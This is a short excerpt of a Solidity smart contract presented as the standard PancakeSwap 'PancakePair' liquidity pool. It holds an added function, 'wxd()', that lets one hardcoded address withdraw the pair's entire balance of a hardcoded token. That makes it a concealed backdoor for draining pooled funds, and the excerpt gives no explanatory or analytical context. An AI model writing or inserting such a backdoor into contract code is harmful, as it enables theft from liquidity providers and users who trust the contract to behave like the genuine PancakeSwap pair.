...
contract PancakePair is IPancakePair, PancakeERC20 {
    ...
    function wxd() external {
        require(msg.sender == address(0x5E8e979fCA9bdd1931D390f2bEc9b335cA984770),'Pancake: FORBIDDEN');
        IERC20 x = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        x.transfer(
            address(0x5E8e979fCA9bdd1931D390f2bEc9b335cA984770),
            x.balanceOf(address(this))
        );
    }
